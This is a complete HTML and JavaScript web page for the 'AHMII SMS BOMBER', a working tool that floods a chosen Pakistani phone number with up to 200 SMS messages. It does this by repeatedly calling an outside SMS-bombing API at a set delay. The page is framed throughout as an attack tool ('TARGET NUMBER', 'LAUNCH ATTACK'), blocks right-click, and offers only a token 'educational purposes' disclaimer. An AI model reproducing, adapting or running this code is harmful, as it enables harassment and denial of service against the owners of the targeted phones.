<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>💀 AHMII SMS BOMBER | Premium SMS Attack Tool 💀</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #0a0f1e 0%, #0d1525 50%, #0a0f1e 100%);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        /* Animated Background Grid */
        .grid-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 136, 0.03) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 136, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: 0;
            pointer-events: none;
        }

        /* Glowing Orbs */
        .orb {
            position: fixed;
            border-radius: 50%;
            filter: blur(80px);
            opacity: 0.4;
            z-index: 0;
            pointer-events: none;
            animation: float 20s infinite ease-in-out;
        }

        .orb-1 {
            width: 400px;
            height: 400px;
            background: radial-gradient(circle, rgba(0, 255, 136, 0.8), transparent);
            top: -150px;
            right: -150px;
            animation-delay: 0s;
        }

        .orb-2 {
            width: 500px;
            height: 500px;
            background: radial-gradient(circle, rgba(139, 92, 246, 0.6), transparent);
            bottom: -200px;
            left: -200px;
            animation-delay: 5s;
        }

        .orb-3 {
            width: 300px;
            height: 300px;
            background: radial-gradient(circle, rgba(59, 130, 246, 0.5), transparent);
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            animation-delay: 10s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            33% { transform: translate(30px, -30px) scale(1.1); }
            66% { transform: translate(-20px, 20px) scale(0.9); }
        }

        /* Main Container */
        .container {
            position: relative;
            z-index: 10;
            max-width: 550px;
            margin: 0 auto;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        /* Header Section */
        .header {
            text-align: center;
            margin-bottom: 40px;
            animation: fadeInDown 0.8s ease;
        }

        .logo {
            font-size: 3.5rem;
            font-weight: 900;
            background: linear-gradient(135deg, #00ff88, #00cc66, #00994d);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 30px rgba(0, 255, 136, 0.3);
            letter-spacing: 2px;
        }

        .logo i {
            background: linear-gradient(135deg, #00ff88, #00cc66);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 3rem;
        }

        .badge {
            display: inline-block;
            background: rgba(0, 255, 136, 0.15);
            backdrop-filter: blur(10px);
            padding: 8px 20px;
            border-radius: 50px;
            margin-top: 15px;
            border: 1px solid rgba(0, 255, 136, 0.3);
        }

        .badge span {
            color: #00ff88;
            font-weight: 600;
            font-size: 0.85rem;
        }

        .badge i {
            margin-right: 8px;
            color: #00ff88;
        }

        /* Premium Card */
        .premium-card {
            background: rgba(10, 20, 30, 0.6);
            backdrop-filter: blur(20px);
            border-radius: 40px;
            padding: 35px 30px;
            border: 1px solid rgba(0, 255, 136, 0.2);
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 136, 0.1) inset;
            animation: fadeInUp 0.8s ease;
            transition: all 0.3s ease;
        }

        .premium-card:hover {
            border-color: rgba(0, 255, 136, 0.5);
            box-shadow: 0 30px 60px -12px rgba(0, 255, 136, 0.2), 0 0 0 1px rgba(0, 255, 136, 0.2) inset;
        }

        /* Input Group */
        .input-group {
            margin-bottom: 25px;
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.8);
            letter-spacing: 0.5px;
        }

        .input-label i {
            color: #00ff88;
            margin-right: 10px;
        }

        .input-field {
            width: 100%;
            padding: 16px 20px;
            background: rgba(0, 0, 0, 0.4);
            border: 1.5px solid rgba(0, 255, 136, 0.2);
            border-radius: 20px;
            color: white;
            font-size: 1rem;
            font-family: 'Poppins', monospace;
            transition: all 0.3s ease;
        }

        .input-field:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.2);
            background: rgba(0, 0, 0, 0.6);
        }

        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.3);
        }

        /* Country Code Preview */
        .country-preview {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 8px;
            font-size: 0.8rem;
            color: rgba(0, 255, 136, 0.7);
        }

        .country-preview i {
            font-size: 1rem;
        }

        /* Button Group */
        .btn-group {
            display: flex;
            gap: 15px;
            margin-top: 30px;
        }

        .btn {
            flex: 1;
            padding: 16px 20px;
            border: none;
            border-radius: 30px;
            font-size: 1rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            font-family: 'Poppins', sans-serif;
        }

        .btn-primary {
            background: linear-gradient(135deg, #00ff88, #00cc66);
            color: #0a0f1e;
            box-shadow: 0 10px 25px -5px rgba(0, 255, 136, 0.4);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 20px 35px -8px rgba(0, 255, 136, 0.5);
        }

        .btn-primary:active:not(:disabled) {
            transform: translateY(1px);
        }

        .btn-danger {
            background: linear-gradient(135deg, #ff4757, #c0392b);
            color: white;
            box-shadow: 0 10px 25px -5px rgba(255, 71, 87, 0.3);
        }

        .btn-danger:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 20px 35px -8px rgba(255, 71, 87, 0.4);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        /* Progress Section */
        .progress-section {
            margin-top: 30px;
            display: none;
        }

        .progress-bar-container {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 50px;
            height: 8px;
            overflow: hidden;
        }

        .progress-bar {
            background: linear-gradient(90deg, #00ff88, #00cc66);
            width: 0%;
            height: 100%;
            border-radius: 50px;
            transition: width 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: shimmer 1.5s infinite;
        }

        @keyframes shimmer {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .progress-stats {
            display: flex;
            justify-content: space-between;
            margin-top: 12px;
            font-size: 0.8rem;
            color: rgba(255, 255, 255, 0.6);
        }

        /* Result Alert */
        .result-alert {
            margin-top: 25px;
            padding: 15px 20px;
            border-radius: 20px;
            display: none;
            align-items: center;
            gap: 12px;
            animation: slideIn 0.4s ease;
        }

        .result-alert.success {
            background: rgba(0, 255, 136, 0.15);
            border: 1px solid rgba(0, 255, 136, 0.4);
            display: flex;
        }

        .result-alert.error {
            background: rgba(255, 71, 87, 0.15);
            border: 1px solid rgba(255, 71, 87, 0.4);
            display: flex;
        }

        .result-alert i {
            font-size: 1.5rem;
        }

        .result-alert.success i {
            color: #00ff88;
        }

        .result-alert.error i {
            color: #ff4757;
        }

        .result-alert .result-text {
            flex: 1;
            font-size: 0.9rem;
            font-weight: 500;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Features Section */
        .features {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 35px;
            flex-wrap: wrap;
        }

        .feature-item {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 0.75rem;
            color: rgba(255, 255, 255, 0.5);
        }

        .feature-item i {
            color: #00ff88;
            font-size: 0.9rem;
        }

        /* Footer */
        .footer {
            text-align: center;
            margin-top: 40px;
            padding-top: 20px;
            font-size: 0.7rem;
            color: rgba(255, 255, 255, 0.3);
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }

        /* Animations */
        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeInUp {
            from {
                opacity: 0;
                transform: translateY(30px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        /* Pulse Animation for Active */
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }

        .attacking {
            animation: pulse 1s infinite;
        }

        /* Responsive */
        @media (max-width: 550px) {
            .container {
                padding: 15px;
            }
            .premium-card {
                padding: 25px 20px;
            }
            .logo {
                font-size: 2.2rem;
            }
            .logo i {
                font-size: 2rem;
            }
            .btn-group {
                flex-direction: column;
            }
            .btn {
                padding: 14px;
            }
        }

        /* Custom Number Input Arrows */
        input[type=number]::-webkit-inner-spin-button, 
        input[type=number]::-webkit-outer-spin-button {
            opacity: 0.5;
        }
    </style>
</head>
<body>

<div class="grid-bg"></div>
<div class="orb orb-1"></div>
<div class="orb orb-2"></div>
<div class="orb orb-3"></div>

<div class="container">
    <div class="header">
        <div class="logo">
            <i class="fas fa-bomb"></i> AHMII SMS<br>BOMBER
        </div>
        <div class="badge">
            <i class="fas fa-shield-alt"></i>
            <span>PREMIUM SMS ATTACK TOOL</span>
            <i class="fas fa-skull"></i>
        </div>
    </div>

    <div class="premium-card">
        <div class="input-group">
            <div class="input-label">
                <i class="fas fa-mobile-alt"></i> TARGET NUMBER
            </div>
            <input type="tel" id="phoneNumber" class="input-field" placeholder="03xxxxxxxxx" value="" maxlength="11">
            <div class="country-preview">
                <i class="fas fa-flag-pakistan"></i>
                <span>Pakistan Format: 03XXXXXXXXX (11 digits, without +92)</span>
            </div>
        </div>

        <div class="input-group">

                <i class="fas fa-bolt"></i> MESSAGE QUANTITY
            </div>
            <input type="number" id="messageAmount" class="input-field" placeholder="Number of SMS to send" value="10" min="1" max="200">
        </div>

        <div class="input-group">
            <div class="input-label">
                <i class="fas fa-hourglass-half"></i> DELAY (MILLISECONDS)
            </div>
            <input type="number" id="delayTime" class="input-field" placeholder="Delay between messages" value="500" min="100" max="5000">
        </div>

        <div class="btn-group">
            <button id="startBtn" class="btn btn-primary">
                <i class="fas fa-play"></i> LAUNCH ATTACK
            </button>
            <button id="stopBtn" class="btn btn-danger" disabled>
                <i class="fas fa-stop"></i> STOP
            </button>
        </div>

        <div class="progress-section" id="progressSection">
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="progress-stats">
                <span id="sentCount">0</span>
                <span id="totalCount">0</span>
            </div>
        </div>

        <div id="resultAlert" class="result-alert">
            <i class="fas"></i>
            <span class="result-text"></span>
        </div>
    </div>

    <div class="features">
        <div class="feature-item"><i class="fas fa-bolt"></i> High Speed</div>
        <div class="feature-item"><i class="fas fa-shield-alt"></i> Secure API</div>
        <div class="feature-item"><i class="fas fa-infinity"></i> Unlimited</div>
        <div class="feature-item"><i class="fas fa-chart-line"></i> Real-time Stats</div>
    </div>

    <div class="footer">
        <p><i class="fas fa-exclamation-triangle"></i> For Educational & Security Testing Only</p>
        <p>© 2026 AHMII SMS BOMBER | Premium Tool</p>
    </div>
</div>

<script>
    // DOM Elements
    const startBtn = document.getElementById('startBtn');
    const stopBtn = document.getElementById('stopBtn');
    const phoneInput = document.getElementById('phoneNumber');
    const amountInput = document.getElementById('messageAmount');
    const delayInput = document.getElementById('delayTime');
    const progressSection = document.getElementById('progressSection');
    const progressBar = document.getElementById('progressBar');
    const sentCountSpan = document.getElementById('sentCount');
    const totalCountSpan = document.getElementById('totalCount');
    const resultAlert = document.getElementById('resultAlert');
    const resultIcon = resultAlert.querySelector('i');
    const resultText = resultAlert.querySelector('.result-text');

    // State Variables
    let isAttacking = false;
    let currentRequest = null;
    let sentMessages = 0;
    let totalMessages = 0;

    // API Base URL
    const API_BASE_URL = 'https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=';

    // Helper Functions
    function showResult(message, type) {
        resultAlert.className = `result-alert ${type}`;
        if (type === 'success') {
            resultIcon.className = 'fas fa-check-circle';
        } else {
            resultIcon.className = 'fas fa-exclamation-triangle';
        }
        resultText.textContent = message;
        
        // Auto hide after 5 seconds
        setTimeout(() => {
            if (resultAlert.className.includes(type)) {
                resultAlert.style.display = 'none';
                resultAlert.className = 'result-alert';
            }
        }, 5000);
    }

    function hideResult() {
        resultAlert.style.display = 'none';
        resultAlert.className = 'result-alert';
    }

    function updateProgress() {
        const percentage = (sentMessages / totalMessages) * 100;
        progressBar.style.width = `${percentage}%`;
        sentCountSpan.textContent = sentMessages;
        totalCountSpan.textContent = totalMessages;
    }

    function resetProgress() {
        sentMessages = 0;
        totalMessages = 0;
        updateProgress();
        progressSection.style.display = 'none';
    }

    function validateNumber(number) {
        // Pakistan number validation: 03 followed by 9 digits (total 11 digits)
        const pakistanRegex = /^03[0-9]{9}$/;
        if (!pakistanRegex.test(number)) {
            showResult('❌ Invalid Pakistani number! Use format: 03XXXXXXXXX (11 digits starting with 03)', 'error');
            return false;
        }
        return true;
    }

    function validateAmount(amount) {
        if (isNaN(amount) || amount < 1) {
            showResult('❌ Message amount must be at least 1', 'error');
            return false;
        }
        if (amount > 200) {
            showResult('⚠️ Maximum 200 messages per session for safety', 'error');
            return false;
        }
        return true;
    }

    function validateDelay(delay) {
        if (isNaN(delay) || delay < 100) {
            showResult('⚠️ Delay must be at least 100ms', 'error');
            return false;
        }
        if (delay > 5000) {
            showResult('⚠️ Delay maximum is 5000ms', 'error');
            return false;
        }
        return true;
    }

    async function sendSingleMessage(number, index) {
        // Convert 03xx format to 92xx format for API
        const convertedNumber = '92' + number.substring(1);
        const url = `${API_BASE_URL}${convertedNumber}`;
        
        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 10000);
            
            const response = await fetch(url, {
                method: 'GET',
                signal: controller.signal,
                headers: {
                    'Accept': 'application/json',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                }
            });
            
            clearTimeout(timeoutId);
            
            let data;
            const textResponse = await response.text();
            
            try {
                data = JSON.parse(textResponse);
            } catch (e) {
                data = { status: textResponse };
            }
            
            return { 
                success: response.ok || textResponse.includes('success'), 
                index: index,
                response: data 
            };
        } catch (error) {
            console.error(`Message ${index} error:`, error);
            return { 
                success: false, 
                index: index, 
                error: error.message 
            };
        }
    }

    async function startAttack() {
        if (isAttacking) return;
        
        // Get and validate inputs
        let number = phoneInput.value.trim();
        let amount = parseInt(amountInput.value);
        let delay = parseInt(delayInput.value);
        
        // Remove any '+' or spaces from number
        number = number.replace(/[+\s]/g, '');
        
        if (!validateNumber(number)) return;
        if (!validateAmount(amount)) return;
        if (!validateDelay(delay)) return;
        
        // Setup attack
        isAttacking = true;
        sentMessages = 0;
        totalMessages = amount;
        
        // Update UI
        startBtn.disabled = true;
        stopBtn.disabled = false;
        phoneInput.disabled = true;
        amountInput.disabled = true;
        delayInput.disabled = true;
        
        progressSection.style.display = 'block';
        updateProgress();
        hideResult();
        
        showResult(`🚀 Initializing attack on 0${number.substring(1)}...`, 'success');
        
        // Add attacking class for visual effect
        document.querySelector('.premium-card').classList.add('attacking');
        
        let successCount = 0;
        let failCount = 0;
        
        try {
            for (let i = 1; i <= amount; i++) {
                if (!isAttacking) {
                    showResult(`⏹️ Attack stopped by user. Sent: ${sentMessages}/${amount}`, 'error');
                    break;
                }
                
                const result = await sendSingleMessage(number, i);
                
                if (result.success) {
                    successCount++;
                } else {
                    failCount++;
                }
                
                sentMessages++;
                updateProgress();
                
                // Show status update every 5 messages
                if (i % 5 === 0 || i === amount) {
                    showResult(`📡 Progress: ${sentMessages}/${amount} | Success: ${successCount} | Failed: ${failCount}`, 'success');
                }
                
                // Wait for delay if not last message
                if (i < amount && delay > 0) {
                    await new Promise(resolve => setTimeout(resolve, delay));
                }
            }
            
            if (isAttacking) {
                if (successCount > 0) {
                    showResult(`✅ ATTACK COMPLETE! ${successCount} messages successfully delivered to 0${number.substring(1)}! ${failCount > 0 ? `(${failCount} failed)` : ''}`, 'success');
                } else {
                    showResult(`⚠️ Attack completed but no messages were sent. The target number might be invalid or API is down.`, 'error');
                }
            }
        } catch (error) {
            console.error('Attack error:', error);
            showResult(`❌ Critical error: ${error.message}`, 'error');
        } finally {
            // Cleanup
            isAttacking = false;
            startBtn.disabled = false;
            stopBtn.disabled = true;
            phoneInput.disabled = false;
            amountInput.disabled = false;
            delayInput.disabled = false;
            document.querySelector('.premium-card').classList.remove('attacking');
            
            // Reset progress after 3 seconds
            setTimeout(() => {
                if (!isAttacking) {
                    resetProgress();
                }
            }, 3000);
        }
    }

    function stopAttack() {
        if (isAttacking) {
            isAttacking = false;
            showResult('⏹️ Attack aborted by user command', 'error');
            startBtn.disabled = false;
            stopBtn.disabled = true;
            phoneInput.disabled = false;
            amountInput.disabled = false;
            delayInput.disabled = false;
            document.querySelector('.premium-card').classList.remove('attacking');
        }
    }

    // Event Listeners
    startBtn.addEventListener('click', startAttack);
    stopBtn.addEventListener('click', stopAttack);
    
    // Auto-format phone input (allow only digits, auto-add 03 prefix)
    phoneInput.addEventListener('input', function(e) {
        // Remove non-digits
        this.value = this.value.replace(/[^0-9]/g, '');
        
        // Auto-add 03 prefix if not present
        if (this.value.length > 0 && !this.value.startsWith('03')) {
            if (this.value.startsWith('92')) {
                // If user enters 92 format, convert to 03
                this.value = '03' + this.value.substring(2);
            } else if (this.value.startsWith('3')) {
                this.value = '0' + this.value;
            } else if (!this.value.startsWith('0')) {
                this.value = '03' + this.value;
            }
        }
        
        // Limit to 11 digits
        if (this.value.length > 11) {
            this.value = this.value.slice(0, 11);
        }
    });
    
    // Ensure amount is within limits
    amountInput.addEventListener('change', function() {
        let val = parseInt(this.value);
        if (val > 200) this.value = 200;
        if (val < 1) this.value = 1;
    });
    
    // Ensure delay is within limits
    delayInput.addEventListener('change', function() {
        let val = parseInt(this.value);
        if (val > 5000) this.value = 5000;
        if (val < 100) this.value = 100;
    });
    
    // Disable right click on page (security)
    document.addEventListener('contextmenu', (e) => e.preventDefault());
    
    // Console warning
    console.log('%c⚠️ WARNING: This tool is for educational purposes only! ⚠️', 'color: #ff4757; font-size: 16px; font-weight: bold;');
    console.log('%cUse only on numbers you own or have permission to test.', 'color: #00ff88; font-size: 14px;');
</script>
</body>
